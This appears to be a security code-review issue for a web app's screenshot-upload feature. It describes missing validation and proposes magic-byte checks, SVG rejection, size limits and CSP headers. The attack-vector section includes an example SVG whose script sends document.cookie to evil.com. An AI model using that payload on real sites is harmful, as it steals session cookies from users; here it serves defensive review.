---
status: pending
priority: p2
issue_id: "018"
tags: [code-review, security, validation, file-upload]
dependencies: []
---

# Problem Statement

**NO FILE UPLOAD VALIDATION**: Image uploads for screenshot capture are not validated for content type, file size, or dimensions before being sent to the Claude Vision API. The plan describes screenshot upload (Phase 2, lines 496-509) with "Drop zone / file picker (accept images)" but specifies no server-side validation. Malicious files could be uploaded: SVGs with embedded JavaScript, oversized images causing memory exhaustion, non-image files with spoofed extensions, or polyglot files that are valid images AND valid HTML. There are no file size limits defined anywhere in the plan — not in the Next.js config, not in Vercel config, not at the application level.

**Why This Matters**: The screenshot capture flow uploads images that are (1) stored in cloud storage (R2/Blob) and potentially served back to users, (2) sent to Claude Vision API for processing, and (3) linked to capture records in the database. Without validation: a malicious SVG could execute JavaScript when viewed in a browser (stored XSS), an oversized image (50MB+) could exhaust serverless function memory on Vercel (128MB-1024MB), and non-image files waste Claude API credits when Vision fails to process them. The Claude Vision API itself has limits (max 20MB per image), but relying on the external API to be your validation layer means paying for rejected requests and getting opaque error messages.

## Findings

**Source**: security-sentinel, code-review

**Evidence**:
- Screenshot upload described (plan lines 496-509) with no validation specifics
- "Accept images" in file picker is client-side only (trivially bypassed)
- No `maxFileSize` configuration in plan
- No Content-Type validation (magic bytes vs extension)
- No image dimension limits
- Cloudflare R2 / Vercel Blob storage has no built-in content scanning
- Claude Vision API max file size: 20MB per image, max 20 images per request
- No image optimization before sending to Claude (wasted API cost on 4K screenshots)
- Stored screenshots served back to users — potential XSS vector via SVG

**Attack Vectors**:

**Vector 1: SVG with Embedded Script (Stored XSS)**
```xml
<!-- Malicious "screenshot.svg" uploaded as image -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
  </script>
  <text y="20">This looks like a normal image</text>
</svg>

<!-- If served with Content-Type: image/svg+xml, script executes -->
<!-- If served inline or via <img> with wrong CSP, XSS achieved -->
```

**Vector 2: Memory Exhaustion**
```
1. Attacker uploads 10 x 50MB PNG files in single capture
2. Server attempts to buffer 500MB
3. Vercel function memory limit: 1024MB max
4. Processing fails with OOM, function crashes
5. Other users' requests affected (shared infrastructure)
```

**Vector 3: Polyglot File**
```
1. Attacker crafts file that is valid JPEG AND valid HTML
2. File passes image extension check
3. Stored in R2 with image content type
4. If served without proper Content-Disposition headers → browser renders as HTML
5. Embedded JavaScript executes in Ember's origin
```

**Impact Severity**: 🟡 MODERATE - XSS risk via stored files, resource exhaustion, wasted API costs

## Proposed Solutions

### Solution 1: Server-Side File Validation with Magic Bytes (Recommended)

**Approach**: Validate uploaded files on the server using magic bytes (file signatures), not just extensions or Content-Type headers. Use the `sharp` library for image processing validation and metadata extraction.

**Implementation**:
```typescript
// src/lib/capture/file-validation.ts
import sharp from 'sharp';

const ALLOWED_TYPES = {
  'image/jpeg': { magic: [0xff, 0xd8, 0xff], maxSizeMB: 10 },
  'image/png': { magic: [0x89, 0x50, 0x4e, 0x47], maxSizeMB: 10 },
  'image/webp': { magic: [0x52, 0x49, 0x46, 0x46], maxSizeMB: 10 },
  'image/heic': { magic: null, maxSizeMB: 15 }, // HEIC has variable magic bytes
} as const;

const MAX_DIMENSION = 4096; // px — larger gets resized
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB
const MAX_FILES_PER_CAPTURE = 10;

interface ValidationResult {
  valid: boolean;
  error?: string;
  metadata?: {
    width: number;
    height: number;
    format: string;
    sizeBytes: number;
  };
}

/**
 * Validate an uploaded image file.
 * Checks magic bytes, dimensions, and file size.
 * Returns metadata if valid.
 */
export async function validateImageFile(
  buffer: Buffer,
  filename: string
): Promise<ValidationResult> {
  // 1. Check file size
  if (buffer.byteLength > MAX_FILE_SIZE) {
    return {
      valid: false,
      error: `File "${filename}" exceeds maximum size of ${MAX_FILE_SIZE / 1024 / 1024}MB`,
    };
  }

  if (buffer.byteLength === 0) {
    return { valid: false, error: `File "${filename}" is empty` };
  }

  // 2. Check magic bytes (file signature)
  const detectedType = detectFileType(buffer);
  if (!detectedType) {
    return {
      valid: false,
      error: `File "${filename}" is not a supported image type. Supported: JPEG, PNG, WebP, HEIC`,
    };
  }

  // 3. Reject SVG explicitly (even if disguised)
  if (isSVG(buffer)) {
    return {
      valid: false,
      error: `SVG files are not supported for screenshot capture`,
    };
  }

  // 4. Use sharp to validate image integrity and get metadata
  try {
    const metadata = await sharp(buffer).metadata();

    if (!metadata.width || !metadata.height) {
      return {
        valid: false,
        error: `File "${filename}" could not be processed as an image`,
      };
    }

    return {
      valid: true,
      metadata: {
        width: metadata.width,
        height: metadata.height,
        format: metadata.format ?? detectedType,
        sizeBytes: buffer.byteLength,
      },
    };
  } catch (error) {
    return {
      valid: false,
      error: `File "${filename}" is corrupted or not a valid image`,
    };
  }
}

/**
 * Detect file type by reading magic bytes.
 * More reliable than Content-Type header or file extension.
 */
function detectFileType(buffer: Buffer): string | null {
  if (buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) {
    return 'jpeg';
  }
  if (buffer[0] === 0x89 && buffer[1] === 0x50 &&
      buffer[2] === 0x4e && buffer[3] === 0x47) {
    return 'png';
  }
  if (buffer[0] === 0x52 && buffer[1] === 0x49 &&
      buffer[2] === 0x46 && buffer[3] === 0x46) {
    // RIFF container — could be WebP
    if (buffer[8] === 0x57 && buffer[9] === 0x45 &&
        buffer[10] === 0x42 && buffer[11] === 0x50) {
      return 'webp';
    }
  }
  // HEIC: check for ftyp box
  if (buffer[4] === 0x66 && buffer[5] === 0x74 &&
      buffer[6] === 0x79 && buffer[7] === 0x70) {
    const brand = buffer.slice(8, 12).toString('ascii');
    if (['heic', 'heix', 'mif1'].includes(brand)) {
      return 'heic';
    }
  }
  return null;
}

/**
 * Check if buffer contains SVG content (even if disguised).
 * SVGs can contain <script> tags and are a XSS vector.
 */
function isSVG(buffer: Buffer): boolean {
  const head = buffer.slice(0, 1024).toString('utf-8').toLowerCase();
  return head.includes('<svg') || head.includes('<?xml');
}

/**
 * Validate a batch of uploads for a single capture.
 */
export async function validateCaptureUploads(
  files: { buffer: Buffer; filename: string }[]
): Promise<{
  valid: boolean;
  errors: string[];
  validFiles: Array<{ buffer: Buffer; filename: string; metadata: NonNullable<ValidationResult['metadata']> }>;
}> {
  if (files.length === 0) {
    return { valid: false, errors: ['No files provided'], validFiles: [] };
  }

  if (files.length > MAX_FILES_PER_CAPTURE) {
    return {
      valid: false,
      errors: [`Maximum ${MAX_FILES_PER_CAPTURE} files per capture. Got ${files.length}.`],
      validFiles: [],
    };
  }

  const errors: string[] = [];
  const validFiles: Array<{ buffer: Buffer; filename: string; metadata: NonNullable<ValidationResult['metadata']> }> = [];

  for (const file of files) {
    const result = await validateImageFile(file.buffer, file.filename);
    if (result.valid && result.metadata) {
      validFiles.push({ ...file, metadata: result.metadata });
    } else {
      errors.push(result.error ?? `Unknown error processing ${file.filename}`);
    }
  }

  return {
    valid: errors.length === 0,
    errors,
    validFiles,
  };
}
```

**Server Action Integration**:
```typescript
// src/lib/actions/create-screenshot-capture.ts
'use server';

import { auth } from '@clerk/nextjs/server';
import { validateCaptureUploads } from '@/lib/capture/file-validation';
import { optimizeForVision } from '@/lib/capture/image-optimization';
import { uploadToR2 } from '@/lib/storage/r2';

export async function createScreenshotCaptureAction(
  formData: FormData
): Promise<ActionState<{ captureId: string }>> {
  const session = await auth();
  if (!session?.userId) {
    return { status: 'error', error: 'Unauthorized' };
  }

  // Extract files from FormData
  const files: { buffer: Buffer; filename: string }[] = [];
  for (const [key, value] of formData.entries()) {
    if (key.startsWith('image') && value instanceof File) {
      const arrayBuffer = await value.arrayBuffer();
      files.push({
        buffer: Buffer.from(arrayBuffer),
        filename: value.name,
      });
    }
  }

  // Validate ALL files before processing any
  const validation = await validateCaptureUploads(files);

  if (!validation.valid) {
    return {
      status: 'error',
      error: `Upload validation failed: ${validation.errors.join('; ')}`,
    };
  }

  // Process valid files
  const imageUrls: string[] = [];

  for (const file of validation.validFiles) {
    // Optimize before storage and Claude Vision
    const optimized = await optimizeForVision(file.buffer, file.metadata);

    // Upload optimized version to R2
    const url = await uploadToR2(optimized.buffer, {
      contentType: `image/${file.metadata.format}`,
      filename: `captures/${session.userId}/${Date.now()}-${file.filename}`,
    });

    imageUrls.push(url);
  }

  // Create capture record and start async processing
  const capture = await createCapture({
    profileId: formData.get('profileId') as string,
    method: 'screenshot',
    imageUrls,
    status: 'pending',
  });

  return { status: 'success', data: { captureId: capture.id } };
}
```

**Pros**:
- Magic byte detection cannot be spoofed by renaming files
- SVG explicitly blocked — eliminates stored XSS vector
- sharp validates image integrity (catches corrupted/malformed files)
- Batch validation rejects entire capture if any file is invalid
- Clear error messages help users fix issues

**Cons**:
- sharp requires native binary (adds ~7MB to Vercel deployment)
- HEIC support may need additional sharp plugins
- Magic byte detection doesn't cover every image format

**Effort**: Low (half day)
**Risk**: Low - standard security practice

### Solution 2: Upload Size Limits in Next.js Config + Vercel Limits

**Approach**: Configure hard upload limits at the framework and platform level as defense in depth.

**Implementation**:
```typescript
// next.config.ts
import type { NextConfig } from 'next';

const nextConfig: NextConfig = {
  // Limit request body size for API routes
  experimental: {
    serverActions: {
      bodySizeLimit: '15mb', // 10 images * ~1.5MB avg = ~15MB max
    },
  },

  // Strict CSP headers to prevent SVG script execution
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline' 'unsafe-eval'", // Needed for Next.js
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' blob: data: https://*.r2.cloudflarestorage.com",
              "connect-src 'self' https://api.anthropic.com https://*.clerk.accounts.dev",
              // Block SVG script execution
              "object-src 'none'",
              "base-uri 'self'",
            ].join('; '),
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff', // Prevent MIME type sniffing
          },
        ],
      },
      {
        // Force download for any stored files (prevent inline rendering)
        source: '/api/images/(.*)',
        headers: [
          {
            key: 'Content-Disposition',
            value: 'attachment',
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
        ],
      },
    ];
  },
};

export default nextConfig;
```

**Vercel Configuration**:
```json
// vercel.json
{
  "functions": {
    "src/app/api/capture/screenshot/route.ts": {
      "maxDuration": 60,
      "memory": 1024
    }
  }
}
```

**R2 Upload with Content-Type Override**:
```typescript
// src/lib/storage/r2.ts
import { S3Client, PutObjectCommand } from '@aws-sdk/client-s3';
import { getSignedUrl } from '@aws-sdk/s3-request-presigner';

const r2 = new S3Client({
  region: 'auto',
  endpoint: process.env.R2_ENDPOINT!,
  credentials: {
    accessKeyId: process.env.R2_ACCESS_KEY_ID!,
    secretAccessKey: process.env.R2_SECRET_ACCESS_KEY!,
  },
});

/**
 * Upload image to R2 with strict content type.
 * Forces Content-Disposition: attachment to prevent inline rendering.
 */
export async function uploadToR2(
  buffer: Buffer,
  options: { contentType: string; filename: string }
): Promise<string> {
  // Only allow known safe content types
  const safeTypes = ['image/jpeg', 'image/png', 'image/webp'];
  const contentType = safeTypes.includes(options.contentType)
    ? options.contentType
    : 'application/octet-stream'; // Force binary for unknown types

  await r2.send(new PutObjectCommand({
    Bucket: process.env.R2_BUCKET!,
    Key: options.filename,
    Body: buffer,
    ContentType: contentType,
    ContentDisposition: 'attachment', // Prevent inline rendering
    CacheControl: 'private, max-age=31536000', // Cache but don't share
  }));

  // Return signed URL (expires in 1 hour)
  const url = await getSignedUrl(
    r2,
    new PutObjectCommand({
      Bucket: process.env.R2_BUCKET!,
      Key: options.filename,
    }),
    { expiresIn: 3600 }
  );

  return url;
}
```

**Pros**:
- Defense in depth — limits enforced at multiple layers
- CSP headers prevent script execution even if SVG slips through
- X-Content-Type-Options: nosniff prevents MIME sniffing attacks
- Content-Disposition: attachment prevents inline rendering of stored files
- Framework-level limits catch oversized payloads before application code

**Cons**:
- CSP can be complex to maintain (may break legitimate functionality)
- Body size limit is aggregate, not per-file
- Vercel limits may change between plans

**Effort**: Low (half day)
**Risk**: Low - configuration changes only

### Solution 3: Image Optimization Pipeline (Resize Before Claude Vision)

**Approach**: Resize and optimize images before sending to Claude Vision API, reducing API costs and standardizing input quality.

**Implementation**:
```typescript
// src/lib/capture/image-optimization.ts
import sharp from 'sharp';

interface OptimizationResult {
  buffer: Buffer;
  originalSize: number;
  optimizedSize: number;
  originalDimensions: { width: number; height: number };
  optimizedDimensions: { width: number; height: number };
  savings: string; // e.g., "73% smaller"
}

const VISION_MAX_DIMENSION = 2048; // Claude Vision works well at this size
const VISION_QUALITY = 85; // JPEG quality — good balance of size vs clarity

/**
 * Optimize an image for Claude Vision API processing.
 * Resizes large screenshots to reduce API cost while preserving readability.
 *
 * Claude Vision pricing is per-image, not per-pixel, but:
 * - Smaller images process faster
 * - Less bandwidth = faster upload
 * - Standardized size = more predictable behavior
 */
export async function optimizeForVision(
  buffer: Buffer,
  metadata: { width: number; height: number; format: string }
): Promise<OptimizationResult> {
  const originalSize = buffer.byteLength;
  let pipeline = sharp(buffer);

  const needsResize =
    metadata.width > VISION_MAX_DIMENSION ||
    metadata.height > VISION_MAX_DIMENSION;

  if (needsResize) {
    pipeline = pipeline.resize({
      width: VISION_MAX_DIMENSION,
      height: VISION_MAX_DIMENSION,
      fit: 'inside', // Maintain aspect ratio, fit within bounds
      withoutEnlargement: true, // Don't upscale small images
    });
  }

  // Convert to JPEG for consistency (unless PNG needed for screenshots with text)
  // PNG preserves text clarity better, so keep PNG for screenshots
  if (metadata.format === 'png') {
    pipeline = pipeline.png({ quality: 100, compressionLevel: 9 });
  } else {
    pipeline = pipeline.jpeg({ quality: VISION_QUALITY, mozjpeg: true });
  }

  // Strip EXIF data (privacy — may contain GPS, device info)
  pipeline = pipeline.rotate(); // Auto-rotate based on EXIF, then strip

  const optimized = await pipeline.toBuffer();
  const optimizedMetadata = await sharp(optimized).metadata();

  const savingsPercent = Math.round((1 - optimized.byteLength / originalSize) * 100);

  return {
    buffer: optimized,
    originalSize,
    optimizedSize: optimized.byteLength,
    originalDimensions: { width: metadata.width, height: metadata.height },
    optimizedDimensions: {
      width: optimizedMetadata.width ?? metadata.width,
      height: optimizedMetadata.height ?? metadata.height,
    },
    savings: savingsPercent > 0 ? `${savingsPercent}% smaller` : 'no change',
  };
}

/**
 * Convert HEIC to PNG (iOS screenshots are often HEIC).
 * Must be done before sharp processing on some platforms.
 */
export async function convertHeicIfNeeded(
  buffer: Buffer,
  format: string
): Promise<Buffer> {
  if (format !== 'heic') return buffer;

  // sharp supports HEIC with libvips compiled with heif support
  return sharp(buffer).png().toBuffer();
}
```

**Cost Savings Calculation**:
```typescript
/**
 * Estimate savings from image optimization.
 *
 * Example: 10 screenshots from iPhone 15 Pro Max
 * Original: 3024 x 6556 px, ~4MB each = 40MB total
 * Optimized: 946 x 2048 px, ~800KB each = 8MB total
 *
 * API cost: Same (per-image pricing)
 * Upload time: 5x faster
 * Processing: More predictable
 * Storage: 80% savings on R2
 */
```

**Pros**:
- Reduces storage costs (80%+ savings on large screenshots)
- Faster upload times (especially on mobile connections)
- Strips EXIF data (removes GPS, device identifiers — privacy win)
- HEIC conversion ensures compatibility
- Standardized input improves Claude Vision consistency

**Cons**:
- sharp native dependency adds to deployment size
- Over-aggressive compression could make text unreadable in screenshots
- Processing time adds to capture latency (~100-300ms per image)
- PNG screenshots should not be converted to JPEG (text quality)

**Effort**: Low (half day)
**Risk**: Low - improves cost and performance

## Recommended Action

**Implement all three solutions — they are complementary and each addresses a different layer**

1. **Solution 1** (magic bytes + sharp validation): Prevents malicious uploads at the application layer
2. **Solution 2** (Next.js config + CSP + storage headers): Defense in depth at framework/platform layer
3. **Solution 3** (image optimization): Reduces costs and standardizes input

Start with Solution 1 + 2 (security-critical), then add Solution 3 (optimization) during Phase 2 when screenshot capture is built.

## Technical Details

**Affected Components**:
- `src/lib/capture/file-validation.ts` — new validation module
- `src/lib/capture/image-optimization.ts` — new optimization module
- `src/lib/storage/r2.ts` — upload with content type enforcement
- `src/lib/actions/create-screenshot-capture.ts` — integrate validation
- `next.config.ts` — body size limits, CSP headers
- `vercel.json` — function memory limits

**Database Changes**:
None — validation is at the application/storage layer.

**New Dependencies**:
```json
{
  "dependencies": {
    "sharp": "^0.33.0"
  }
}
```

## Acceptance Criteria

- [ ] Server-side magic byte validation rejects non-image files
- [ ] SVG files explicitly blocked (even if disguised with image extension)
- [ ] File size limit enforced: 10MB per file, 15MB total per capture
- [ ] Maximum 10 files per capture enforced server-side
- [ ] Corrupted/malformed images rejected with clear error message
- [ ] HEIC files from iOS converted to PNG for processing
- [ ] Images resized to max 2048px before Claude Vision API
- [ ] EXIF data stripped from all stored images (privacy)
- [ ] Content-Disposition: attachment set on all stored images
- [ ] X-Content-Type-Options: nosniff header on all responses
- [ ] CSP headers configured to prevent SVG script execution
- [ ] Unit tests cover: valid JPEG, valid PNG, SVG rejection, oversized file, empty file, corrupted file, polyglot file
- [ ] Integration test: upload → validate → optimize → store → serve pipeline

## Work Log

### 2026-02-10
- **Review finding**: Security review identified missing file upload validation for screenshot capture
- **Severity**: Marked as P2 MODERATE - XSS risk via stored SVGs, resource exhaustion, wasted API costs
- **Plan gap**: Screenshot upload (Phase 2, lines 496-509) has no validation specifics
- **Key risks**: Stored XSS via SVG, OOM from oversized images, API cost waste
- **Next step**: Implement magic byte validation and CSP headers before screenshot capture ships

## Resources

- [Plan document section](docs/plans/2026-02-10-feat-ember-mvp-persistent-ai-memory-plan.md#L496-L509) - Screenshot upload interface
- [Plan document section](docs/plans/2026-02-10-feat-ember-mvp-persistent-ai-memory-plan.md#L225) - Image storage (R2/Blob)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [sharp Documentation](https://sharp.pixelplumbing.com/) - Image processing library
- [Claude Vision API](https://docs.anthropic.com/en/docs/build-with-claude/vision) - Image input requirements
- [SVG Security](https://owasp.org/www-community/attacks/Cross-site_Scripting_via_SVG) - XSS via SVG
- [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) - CSP reference
